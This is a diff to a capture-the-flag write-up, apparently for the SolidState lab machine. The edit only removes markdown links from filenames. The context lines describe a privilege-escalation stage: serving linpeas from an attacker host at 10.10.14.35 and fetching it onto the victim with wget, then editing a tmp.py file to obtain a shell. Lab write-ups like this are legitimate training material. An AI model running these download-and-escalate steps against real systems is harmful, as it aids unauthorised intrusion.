@@ -206,13 +206,13 @@ Lets try accessing admin with this now
 
 We will still have to do some privesc, lets get linpeas on this and start enumerating for some vectors
 
-We set up the server in the dir containing [linpeas.sh](http://linpeas.sh) with
+We set up the server in the dir containing linpeas with
 
 ```python3 -m http.server```
 
 And then we use this command on the victim's machine to grab it
 
-```wget [http://10.10.14.35:8000/linpeas.sh](http://10.10.14.35:8000/linpeas.sh)```
+```wget http://10.10.14.35:8000/linpeas.sh linpeas.sh```
 
 ![Image](/assets/img/solidstate/image_21.png)
 
@@ -262,7 +262,7 @@ Lets upgrade our shell a bit first
 
 ![Image](/assets/img/solidstate/image_30.png)
 
-Now lets edit the [tmp.py](http://tmp.py) file
+Now lets edit the tmp.py file
 
 and in 3 minutes we should have gotten our shell
 
